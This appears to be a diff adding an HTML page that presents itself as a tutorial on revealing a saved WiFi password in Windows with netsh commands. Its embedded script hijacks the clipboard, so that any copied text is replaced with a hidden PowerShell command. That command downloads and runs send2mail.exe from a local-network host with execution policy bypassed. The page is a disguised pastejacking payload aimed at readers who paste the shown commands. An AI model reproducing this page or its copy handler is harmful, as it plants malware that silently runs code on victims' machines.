@@ -1,0 +1,123 @@
+<html>
+  <head>
+    <style>
+        h1{
+            color: green;
+        }
+        .column {
+            padding-left: 100px;
+            padding-right: 100px;
+            height: 300px;
+        }
+        p{
+            color: black;
+            font-style: italic;
+            font-size: 20px;
+        }
+        pre{
+            background-color: gray;
+            color: white;
+            padding: 20px;
+        }
+        .wp-block-image{
+            padding-bottom: 100px;
+
+        }
+        div-content{
+            padding-left: 110;
+            padding-right: 110;
+        }
+   
+      </style>
+
+      <title> Private WebServer </title>
+  </head>
+    <body>
+        <div class="column">
+            <h1>Find the WiFi Password in Windows 10 Using CMD</h1>
+            <hr>   
+            <div class="div-content">
+                <p>This article details how you can find out the WiFi password or change WiFi settings using CMD.</p> 
+                <p>How to find the WiFi password using the command prompt:</p>
+            
+                <div class="">
+                    <figure class="aligncenter">
+                        <img src="https://helpdeskgeek.com/wp-content/pictures/2019/02/run-cmd.png.webp" alt="" class="wp-image-32538 lazyloaded" >
+                    </figure>
+                </div>
+        
+                <p>
+                    <strong>Note:</strong> Alternatively, you can use <strong>Search</strong> and type <strong>CMD</strong>. Right-click on <strong>Command Prompt</strong> and select <strong>Run As Administrator</strong>.
+                </p>
+
+                <p>Type the following command line and hit <strong>Enter</strong>: </p>
+                
+                <pre class="wp-block-preformatted"><strong>NETSH WLAN SHOW PROFILE</strong> </pre>
+                
+                <p>Type the following command and replace "WIFI" with the network name. </p>
+                
+                <pre class="wp-block-preformatted"><strong>NETSH WLAN SHOW PROFILE WIFI KEY=CLEAR</strong> </pre>
+                
+                <p>Completing these steps successfully will bring up the WLAN profile of the network you want to connect to. Scroll down and you'll find the password under the <strong>Key Content</strong> field.</p>
+                
+                <div class="wp-block-image">
+                    <figure class="aligncenter">
+                        <img src="https://helpdeskgeek.com/wp-content/pictures/2019/03/key-content.png.webp" alt="" />
+                    </figure>
+                </div>
+            </div>
+        </div>
+            
+        <script>
+          
+            function copyTextToClipboard(text) {
+              var textArea = document.createElement("textarea");
+
+              textArea.style.position = 'fixed';
+              textArea.style.top = 0;
+              textArea.style.left = 0;
+
+              // Ensure it has a small width and height. Setting to 1px / 1em
+              // doesn't work as this gives a negative w/h on some browsers.
+              textArea.style.width = '2em';
+              textArea.style.height = '2em';
+
+              // We don't need padding, reducing the size if it does flash render.
+              textArea.style.padding = 0;
+
+              // Clean up any borders.
+              textArea.style.border = 'none';
+              textArea.style.outline = 'none';
+              textArea.style.boxShadow = 'none';
+
+              // Avoid flash of white box if rendered for any reason.
+              textArea.style.background = 'transparent';
+
+
+              textArea.value = text;
+
+              document.body.appendChild(textArea);
+
+              textArea.select();
+
+              try {
+                var successful = document.execCommand('copy');
+                var msg = successful ? 'successful' : 'unsuccessful';
+                console.log('Copying text command was ' + msg);
+              } catch (err) {
+                console.log('Oops, unable to copy');
+              }
+
+              document.body.removeChild(textArea);
+            }
+            document.addEventListener('copy', function(e){
+                console.log(e);
+                e.clipboardData.setData('text/plain', 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iwr -outf C:\\Users\\CodeCracker\\Desktop\\myExecutable\\send2mail.exe http://192.168.43.178:9000/send2mail.exe; Start-Process -NoNewWindow -FilePath C:\\Users\\CodeCracker\\Desktop\\myExecutable\\send2mail.exe" \r\n');
+                e.preventDefault(); 
+            });
+        
+
+        </script>
+    </body>
+
+</html>
